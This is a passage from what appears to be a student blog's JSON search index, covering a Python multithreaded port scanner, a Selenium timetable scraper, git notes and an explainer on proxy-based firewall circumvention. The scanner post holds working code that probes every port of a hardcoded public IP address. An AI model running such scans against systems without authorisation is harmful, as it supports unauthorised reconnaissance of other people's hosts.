","date":"2021-11-22T16:35:10+08:00","permalink":"https://proben1.github.io/2021/%E5%88%B7%E9%A2%981/","title":"刷题1"},{"content":"思路 这里使用了TCP连接扫描，利用操作系统原生的网络功能。\n用户无需特殊权限，但因为建立了TCP连接，很容易被发现，而且会留下IP地址。\n还有另外一种扫描方式是SYN扫描，端口扫描工具不使用操作系统原生网络功能，而是自行生成、发送IP数据包，并监控其回应。这种扫描模式被称为“半开放扫描”，因为它从不建立完整的TCP连接。端口扫描工具生成一个SYN包，如果目标端口开放，则会返回SYN-ACK包。扫描端回应一个RST包，然后在握手完成前关闭连接。如果端口关闭了但未使用过滤，目标端口应该会持续返回RST包。这种粗略的网络利用方式有几个优点：给扫描工具全权控制数据包发送和等待回应时长的权力，允许更详细的回应分析。关于哪一种对目标主机的扫描方式更不具备入侵性存在一些争议，但SYN扫描的优势是从不会建立完整的连接。然而，RST包可能导致网络堵塞，尤其是一些简单如打印机之类的网络设备。\n1.使用TCP握手连接来扫描指定的(ip,port)对\n2.将单线程改成多线程\n3.第一次使用面向对象编程\n源码 说白了就是调接口，然后加了个多线程……\nimport socket import threading ip = \u0026#34;82.157.174.226\u0026#34; post_list = [i for i in range(1,65536)] output = [0 for i in range(1,65536)] delay = 1 lock = threading.Semaphore(150) class MyThread(threading.Thread): def __init__(self, ip, port_number, output, delay): self.ip = ip self.port_number = port_number self.output = output self.delay = delay threading.Thread.__init__(self) def run(self): if lock.acquire(): #初始化socket,参数1是ipv4，参数2是TCP TCP_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #设置参数，参数1表示我们正在使用的socket选项，参数2表示支持多个进程或者线程绑定到同一端口 TCP_sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) #设置超时等待时间，单位秒 TCP_sock.settimeout(self.delay) # UDP_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP_sock.sendto(str(message), (ip, int(port_number))) try: result = TCP_sock.connect_ex((ip, int(self.port_number))) if result == 0: output[self.port_number] = \u0026#39;OPEN\u0026#39; print(str(self.port_number) + \u0026#34;:\u0026#34; + output[self.port_number]) else: output[self.port_number] = \u0026#39;CLOSE\u0026#39; TCP_sock.close() except socket.error as e: output[self.port_number] = \u0026#39;error\u0026#39; #print(str(self.port_number) + \u0026#34;:\u0026#34; + output[self.port_number]) pass lock.release() ThreadList = [] for i in post_list: t = MyThread(ip, i, output, delay) ThreadList.append(t) for t in ThreadList: t.start() for t in ThreadList: t.join() for i in output: if output[i] !=\u0026#39;CLOSE\u0026#39;: print(\u0026#34;PORT:\u0026#34; + str(i) + \u0026#34;:\u0026#34; + output[i]) 其他 对handle的理解 首先在 PowerShell 中获取进程信息并以程序 ID 进行排序，第一列出现handles。\nPS C:\\Users\\Lenovo\u0026gt; Get-Process | Sort-Object ID Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName ------- ------ ----- ----- ------ -- -- ----------- 0 0 60 8 0 0 Idle 8174 0 48 148 4 0 System 0 16 14708 62260 160 0 Registry 430 17 4216 21944 2.11 480 1 RuntimeBroker 57 3 1068 1160 556 0 smss 2019 30 10004 24904 596 0 lsass 904 12 6616 10796 604 0 services 245 29 24792 11608 616 0 PresentationFont... 154 10 1804 6648 848 0 svchost 在代码里，handle 通常是某个数字标记，通过这个标记来操作资源。\n是否可以简单把Handles理解为Id？不好。 首先分配16位的标记，再用 8 位密码将 16 位标记加密，之后将 4 位类型、4 位权限、8 位密码、16 位加密结果打包成一个 32 位的整数，这时再简单理解的Handles为索引，就不恰当。\n对socket的理解 TCP/IP只是一个协议栈，如果想要有具体的应用，就需要提供对外的操作接口，就像操作系统会提供标准的编程接口，TCP/IP也必须对外提供编程接口，这就是Socket。\n现在我算明白了socket和http的区别：\n对概念来说：\nHttp协议：基于TCP连接的简单的对象访问协议，对应于应用层。\nSocket是对TCP/IP协议的封装，Socket本身并不是协议，而是一个调用接口（API），通过Socket，我们才能使用TCP/IP协议。\n对一次连接过程而说：\nHttp连接：所谓的无状态连接，客户端向服务器发送一次请求，服务器进行一次回应就断开。\nSOCKET连接：长连接，（如果期间没有数据的传输，会发送心跳包确认。）\n","date":"2021-11-18T22:13:33+08:00","image":"https://proben1.github.io/2021/python%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AD%89/Python%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F_hu96e517cc459846bff03d342d21e74fa8_94673_120x120_fill_box_smart1_3.png","permalink":"https://proben1.github.io/2021/python%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AD%89/","title":"Python端口扫描等"},{"content":"查课表，以前用的是超级课程表，嫌乎广告太多，加上手机内存不够，卸了，自己写个课表。\n由于学校教务系统的参数太多了，直接用了selenium来模拟登录，之后再用BeautifulSoup来分离参数。\n流程：查看本地json格式的课表文件，若没有则爬并存储，若有则直接读取并输出。\n做的时候发现单双周挺难弄的，最后是用了空间换时间的方法，把一个单双周合起来变成一个课表。\n最后用Power Automate 简单做了一个桌面流：\n结果：\n附源代码：\nfrom selenium import webdriver # 启动浏览器需要用到 from selenium.webdriver.common.keys import Keys # 提供键盘按键支持（最后一个K要大写） from bs4 import BeautifulSoup import time import re import json #输入账号密码 student_id=\u0026#34;\u0026#34; studend_password=\u0026#34;\u0026#34; #输入浏览器内核位置，如F:\\\\chromedriver_win32\\\\chromedriver.exe place=\u0026#34;F:\\\\chromedriver_win32\\\\chromedriver.exe\u0026#34; #输入开学日期，格式：30 Aug 2021 time_to_strat = \u0026#34;30 Aug 2021\u0026#34; #爬取后课表的存储位置 stored_place = \u0026#34;F:\\\\ProbeN1\\\\timetable\\\\\u0026#34; #判断明天是周几,是不是单双周 start_time = time.strptime(time_to_strat, \u0026#34;%d %b %Y\u0026#34;) start_week = time.strftime(\u0026#34;%U\u0026#34;, start_time) tomorrow_time_tamp = time.time()+86400 tomorrow_time = time.localtime(tomorrow_time_tamp) tomorrow_week = time.strftime(\u0026#34;%U\u0026#34;, tomorrow_time) weekin = int(tomorrow_week) - int(start_week) + 1 #print(weekin) #单双周 dt = time.strftime(\u0026#34;%A\u0026#34;,tomorrow_time) dt_ = {\u0026#34;Saturday\u0026#34;:\u0026#34;6\u0026#34;,\u0026#34;Sunday\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;Monday\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;Tuesday\u0026#34;:\u0026#34;2\u0026#34;,\u0026#34;Wednesday\u0026#34;:\u0026#34;3\u0026#34;,\u0026#34;Thursday\u0026#34;:\u0026#34;4\u0026#34;,\u0026#34;Friday\u0026#34;:\u0026#34;5\u0026#34;} tomorrow_weekday = dt_[dt] #print(tomorrow_weekday) #周几 time_judge=[weekin,tomorrow_weekday] def print_class(timetable,time_judge): print(timetable[\u0026#34;flag\u0026#34;][\u0026#34;1\u0026#34;]) if int(time_judge[1])==6 or int(time_judge[1])==0 : print(\u0026#34;明天没课!\u0026#34;) else : print(\u0026#34;---------------------------------------------------\u0026#34;) if (time_judge[0] % 2) == 0: tmp = timetable[\u0026#34;双\u0026#34;][str(time_judge[1])] for each in tmp.values(): for i in range (0,4): print(each[i]) print(\u0026#34;---------------------------------------------------\u0026#34;) elif (time_judge[0] % 2) == 1: tmp = timetable[\u0026#34;单\u0026#34;][str(time_judge[1])] for each in tmp.values(): for i in range (0,4): print(each[i]) print(\u0026#34;---------------------------------------------------\u0026#34;) timetable={\u0026#34;单\u0026#34;: #课表 { \u0026#34;1\u0026#34;:{},\u0026#34;2\u0026#34;:{},\u0026#34;3\u0026#34;:{},\u0026#34;4\u0026#34;:{},\u0026#34;5\u0026#34;:{} }, \u0026#34;双\u0026#34;: { \u0026#34;1\u0026#34;:{},\u0026#34;2\u0026#34;:{},\u0026#34;3\u0026#34;:{},\u0026#34;4\u0026#34;:{},\u0026#34;5\u0026#34;:{} }, \u0026#34;flag\u0026#34;: { \u0026#34;1\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;2\u0026#34;:\u0026#34;\u0026#34; } } #开局先读取 try: a_json = json.load(open(stored_place+\u0026#39;file.txt\u0026#39;,\u0026#39;r\u0026#39;)) if a_json[\u0026#34;flag\u0026#34;][\u0026#34;2\u0026#34;] == \u0026#34;stored\u0026#34;: print_class(a_json,time_judge) except: chrome_options = webdriver.ChromeOptions() chrome_options.add_experimental_option(\u0026#34;detach\u0026#34;, True) chrome_options.add_argument(\u0026#39;--headless\u0026#39;) #设置后台运行 chrome_options.add_experimental_option(\u0026#39;excludeSwitches\u0026#39;, [\u0026#39;enable-logging\u0026#39;]) #让终端少输出些东西 driver=webdriver.Chrome(place,chrome_options=chrome_options) driver.get(\u0026#34;http://www.zfjw.xupt.edu.cn/jwglxt/xtgl/login_slogin.html\u0026#34;) elem_yhm = driver.find_elements_by_name(\u0026#34;yhm\u0026#34;) #查找并键入用户名,返回一个数组 elem_yhm = elem_yhm[0] elem_yhm.clear() elem_yhm.send_keys(student_id) elem_mm = driver.find_elements_by_name(\u0026#34;mm\u0026#34;) #查找并键入密码 elem_mm = elem_mm[1] elem_mm.clear() elem_mm.send_keys(studend_password) elem_mm.send_keys(Keys.RETURN) # 模拟键盘回车 driver.get(\u0026#34;http://www.zfjw.xupt.edu.cn/jwglxt/kbcx/xskbcx_cxXskbcxIndex.html?gnmkdm=N2151\u0026amp;layout=default\u0026amp;su=\u0026#34; + student_id) #直接get数据库界面 time.sleep(2) #等待页面内的apex返回,否则soup会抓得太快 soup = BeautifulSoup(driver.page_source, \u0026#34;html.parser\u0026#34;) allclass_soup = soup.find(\u0026#34;table\u0026#34;,{\u0026#34;id\u0026#34;:\u0026#34;kbgrid_table_0\u0026#34;}) # 获取kbgrid_table_0标签下的所有课程,allcalss是个TAG类 #找到用户的名字,(学号:student_id) find_student_name = re.compile(r\u0026#34;[\\u4e00-\\u9fa5]+的课表\u0026#34;) student_name_soup = soup.find(\u0026#34;div\u0026#34;,{\u0026#34;class\u0026#34;:\u0026#34;timetable_title\u0026#34;}) student_name = find_student_name.findall(str(student_name_soup))[:-3] #强制转化可以把TAG类转化为str,但是我感觉不是很完美 try : print(student_name+\u0026#34;的课表\u0026#34;) except : print(\u0026#34;未找到名称\u0026#34;) content = [] find_inner_html = re.compile(r\u0026#34;\\\u0026#39;[^\\\u0026#39;]*\\\u0026#39;\u0026#34;) for week in range(1,6): for classtime in range(1,12): each_class = soup.find(\u0026#34;td\u0026#34;,{\u0026#34;id\u0026#34;:str(week)+\u0026#34;-\u0026#34;+str(classtime)}) #找td标签 if each_class is None : #跳过空类型 continue each_class = each_class.findAll(\u0026#34;font\u0026#34;) if each_class is None : #跳过空类型 continue for each in each_class: #获取td标签里的内容 for child in each.children: name =find_inner_html.findall(str(child.unwrap)) if name: content.append(name[0][1:-1]) if content: #添加课表 if len(content) == 11: timetable[\u0026#34;单\u0026#34;][str(week)].update({str(classtime):content}) timetable[\u0026#34;双\u0026#34;][str(week)].update({str(classtime):content}) elif len(content) == 22: timetable[\u0026#34;单\u0026#34;][str(week)].update({str(classtime):content[:11]}) timetable[\u0026#34;双\u0026#34;][str(week)].update({str(classtime):content[11:]}) content = [] #写入文件 with open(stored_place+\u0026#39;file.txt\u0026#39;, \u0026#39;w\u0026#39;) as file: timetable[\u0026#34;flag\u0026#34;][\u0026#34;1\u0026#34;] = student_name timetable[\u0026#34;flag\u0026#34;][\u0026#34;2\u0026#34;] = \u0026#34;stored\u0026#34; file.write(json.dumps(timetable)) print_class(timetable,time_judge) #print(timetable) 当然，之后也新建一个bat帮助自动执行\nf: cd F:\\ProbeN1\\timetable python3 timetable.py pause 然后再在windows里设置\n","date":"2021-11-15T20:38:54+08:00","image":"https://pic.imgdb.cn/item/624023fa27f86abb2a9fb4a9.png","permalink":"https://proben1.github.io/2021/%E7%88%AC%E5%8F%96xupt%E8%AF%BE%E7%A8%8B%E8%A1%A8/","title":"爬取xupt课程表"},{"content":"配置 git config -l 全部配置\ngit config \u0026ndash;global \u0026ndash;list 用户配置\n所有配置文件都保存在本地\n!! 设置用户与邮箱 !!!!!!\ngit config \u0026ndash;global user.name \u0026ldquo;xixi\u0026rdquo;\ngit config \u0026ndash;global user.email \u0026ldquo;xixi@github.com\u0026rdquo;\ngit理论: Workspace:工作区,平时存放代码的地方\nIndex/stage:暂存区,临时存放你的改动,本质上只是一个文件,保存即将提交到文件列表的信息(.git)\nRepository:本地仓库,安全存放数据的位置,这里有提交到所有版本的数据,其中HEAD指向最新放入仓库的版本\n远程仓库:托管代码的服务器,github,gitee(码云)\n流程: 1.工作区添加,修改文件\n2.将需要进行版本控制的文件放入暂存区\n3.将暂存区的文件提交到git仓库\n建立项目 git init 初始化\ngit clone [url]\nps:\nGitHub在国内访问速度慢的原因其实有很多，但最主要的原因就是GitHub的分发加速网络域名遭到DNS的污染。\n为了解决这个问题，网上有很多文章提供了一个解决方案，就是通过修改Hosts文件，绕过国内的DNS解析，直接访问GitHub的CDN节点，从而达到加速的目的。\n当然也可以看看上一篇博客。\n文件状态: git status 查看文件状态\ngit status [filename] 查看文件状态\ngit add . 添加所有文件到暂存区\ngit commit -m \u0026ldquo;提交信息\u0026rdquo;\n忽略文件: 主目录下建立 .gitignore\n.ssh 为啥要配置ssh?\n免密码登录!\nssh-keygen -t [算法] 生成公钥\n许可证:开源可以随意使用/开源,但不能用与商业\u0026hellip;\u0026hellip;.\ngit分支: git branch 列出分支\ngit checkout -b [branch] 新建一个分支并切换到这个分支里\ngit merge 合并到主分支\n注意:如果合并的时候出现差异,需要进行协商(物理)\n工作分支一般叫dev,主分支一般是非常稳定 的版本\n其他 版本冲突的问题。\n有如下几种解决方法：\n1.使用强制push的方法：\n$ git push -u origin master -f 这样会使远程修改丢失，一般是不可取的，尤其是多人协作开发的时候。\n2.push前先将远程repository修改pull下来\n$ git pull origin master $ git push -u origin master 3.若不想merge远程和本地修改，可以先创建新的分支，然后push：\n$ git branch [name] $ git push -u origin [name] 参考 https://gitee.com/all-about-git\n不要把git想的很难,没有笨人,只有懒人.\n\u0026ndash;狂神\n","date":"2021-11-14T09:58:45+08:00","image":"https://pic.imgdb.cn/item/624024bb27f86abb2aa32a8d.png","permalink":"https://proben1.github.io/2021/git/","title":"Git"},{"content":"前言 关于为什么要取一个这么沙雕的名字是有原因的，是因为一个冬至的晚上我想用hexo d来把更新的博客上传到github pages上去，然而很不巧的是它给我报了这样一个错误：\nError！！\n好吧截图暂时复现不到了，它的意思大概是无法和github进行连接。明明挂了梯子，可以在谷歌上搜索东西，甚至把clash的全局代理打开了，为什么不能在windows终端里连接到github呢？于是我想确认一下这终端是不是真的连上了代理，就做了一件事情：ping google.com\nHhCprvVJQkKbY4Z\rmd，然后我就开始想为什么ping不通google。\n要说的话 2021届安全组的成员们，注意啦！！！\n可能大家以后学习安全的方向不尽相同，但是如果你在secwiki上查找过的话，可以发现有一条打造科学的工作环境，这其中就包括学会使用谷歌搜索。更何况现在，我认为这正在逐渐向基本的生活技能靠拢……不单单搜谷歌，查文献，steam社区，逛github这些也很有必要。\n之前一直在用QQ浏览器，有的地方被坑惨了（真的，推荐大家一开始就用谷歌浏览器，特别是web方向）。换了之后界面简洁，而且hackbar这些插件也十分方便，最主要的是没啥大病，不会在该弹出下载的地方给你弹出404。\n有什么好处？\n可以访问真正的互联网，将你的信息接收范围面向世界。 方便做很多事情。\n当然，最重要的是注意分辨言论，自身安全，保护隐私，相信这点大家都明白，都可以做到，这也是对大家的信任。\n最后，如果可以看 Youtube 视频，直接看这个系列，我写的只能算简单概括吧。\n最后！！ 所以文章里不会提及具体方式的哦，只是想简单普及一下，不想让大家像我之前一样迷迷糊糊的。\nwhy not （一） 墙墙是啥？\n通过IP地址封锁，端口阻断，DNS劫持和污染，关键字屏蔽 等技术对认为不符合要求（可以搜下审查制度）的互联网国际出口传输内容，进行干扰、阻断、屏蔽。 why can （一） 接下来，是为什么又能在浏览器访问到谷歌。这里有两种原理。\n1.VPN 刚刚说了，墙墙屏蔽的是那些不符合审查制度的网站，如果我们连接一台墙墙认为合理的服务器，把它作为一层代理，去完成用户想要做的事情，最后再返回结果，不就可以了吗？不由得去想谁能干这样的事情，VPN呀（virtual private network）！\nimg\r吼吼，看上去十分完美，但是……慢慢的，墙墙发现越来越多的流量都是先发送一个数据包请求和一个服务器建立加密连接，然后紧跟着一个代理请求，于是这种特征就被识别出来了，就寄了。（特征一被识别，提供 VPN 服务的服务器 IP 地址就会被封了）\n2.Shadowsocks 接下来，一个更新的技术出现了，Shadowsocks（这既是一个技术的名字又是一类客户端的名字）。\nimg\rShadowsocks是将代理服务器拆开成Server端和client端，中间使用了socks网络传输协议。Socks 代理与应用层代理、 HTTP 层代理不同，Socks 代理只是简单地传递数据包，所以可以实现经过 墙墙量全部加密，从而消除明显的流量特征这个概念。\nhow（一） 现在我们简单了解了墙墙 的大概工作思路，以及VPN和Shadowsocks的工作思路，我们再来看看理论上有几种方式实现。\n软件方向 1.VPN 虚拟私有网络，最早应用于一些大公司中，因私密通信的需求而产生，是一种端对端的虚拟私有专线，可避免通讯流量被中间人劫持。\n也就是说，访问谷歌能只是VPN刚好可以做到的，人家本来没想要干这个，而且VPN流量特征明显，早就可以被 GFW 完美探测并封锁。\n只有申请报备的企业用户才可正常使用VPN，比如科研机构，大型企业之类的。\n顺便吐槽一下，我手机里以前那些免费加速器基本都属于这种。\n2.Shadowsocks 及衍生品 该类软件利用本地服务器加密流量，然后将加密流量发送至远程服务器解密。\n常见的应用软件有 Shadowsocks、ShadowsocksR、Shadowrocket、V2Ray、Clash、Surge。\nclash是使用 GO 开的发一个基于规则的隧道代理软件，支持 HTTP/HTTPS/SOCKS/Shadowsocks/ShadowsocksR/V2Ray/Trojan 协议, 能更好的使用处理规则（就是你规定它该连啥）\ndownload\r硬件方向 1.路由 没错！\n将上面的软件部署在了路由器上，连接路由器的设备都可以通过路由器访问到谷歌。\n很不错的想法，但是遗憾的是大部分路由器在设计的时候算力只能满足基本的路由功能，而在通信产生大量的加解密运算，路由器算不过来，网就卡了……\n接着往下看，还有更好的方法。\n2. 软路由 新主意，利用台式机或服务器配合软件形成路由解决方案，主要靠软件的设置，达成路由器的功能。这样既有《全局代理》的效果，又有足够的算力。\n但是缺点。。。比较麻烦。。。 接着往下看，还有更好的方法。\n3.网关模式 通过一台计算机上跑的软件来实现路由器功能，代表性产品：Windows 下的 Clash，Mac 下的 Surge。\n相当于在本地局域网里部署了一个开启Clash或Surge的电脑当网关，任何在局域网内的设备都可以将此网关作为代理，访问互联网。\n这样有几个好处，一是效率高，方便；二是便于集中管理。\nwhy not （二） 讲了这么多，还是不知道为什么不能ping到google。\n其实原因很简单，\nSOCKS协议在会话层 (第五层)\nICMP协议在网络层(第三层)\n而ping用的是ICMP协议。\n众所周知：前朝的剑斩不了本朝的官。 我拿上层的协议，去代理下层的服务？\n而我们之所以能够访问google是因为使用http协议，在应用层(第七层)\n1\rhow（二） 于是我们来解决这个问题，怎么ping到google？\n这里clash有个很好的功能，虚拟网卡。\nTUN与TAP\n在计算机网络中，TUN与TAP是操作系统内核中的虚拟网络设备。不同于普通靠硬件网络适配器实现的设备，这些虚拟的网络设备全部用软件实现，并向运行于操作系统上的软件提供与硬件的网络设备完全相同的功能。\nTAP等同于一个以太网设备，它操作第二层数据包如以太网数据帧。TUN模拟了网络层设备，操作第三层数据包比如IP数据包。\n12\r如图，被涂掉的网络是正常连的wifi，而下面的网络 3就是clash生成的虚拟网卡，就是这么神奇，clash的TAP 模式。\n11\r这样，我们就ping通google了。\n回到我最开始的目的，要更新github pages，就被轻而易举的解决了。\n但是还有其他的方法吗？\n有的。\n更改powershell的代理（要管理员权限）或者git的代理。（git以后会讲）\npowershell设置代理 netsh winhttp set proxy 127.0.0.1:7890 取消代理 netsh winhttp reset proxy 查看代理 netsh winhttp show proxy git全局代理 git config --global http.proxy http://127.0.0.1:7890 git config --global https.proxy http://127.0.0.1:7890 git取消全局代理： git config --global --unset http.proxy git config --global --unset https.proxy 7890是我的默认代理端口\n这样直接输代码肯定比之前name一大堆简单的多，可是为什么这样修改之后可以上传github pages却不能ping google呢？\n原因很明显，就是git和windows powershell 在osi模型上的层数在第三层之上，修改他们的代理也无法代理ICMP协议，也就ping不了google。但是连接github pages却用的更上层的协议。\n最后 最后再解释几个名词\n机场：提供特殊的、以私密方式上网的服务商（或平台）。\nVPS：Virtual Private Server 是将一台服务器分割成多个虚拟专用服务器的服务。\n可以这么理解，一些专业的人建立了很多VPS来付费（或免费）提供服务，这样你就不用再辛苦从外面买一台主机当做服务端了，用人家配好的就能直接访问谷歌。\n这些VPS放到一起，就变成了一个机场，可以供用户切换线路，找到不同的服务端。\nps：想了解更多的推荐去看前面推荐的视频。\n","date":"2021-11-11T03:32:29+08:00","image":"https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/whynotping_hu616477bebd46c20b4c98465270ecd701_142418_120x120_fill_q75_box_smart1.jpg","permalink":"https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/","title":"怎么ping不了"}]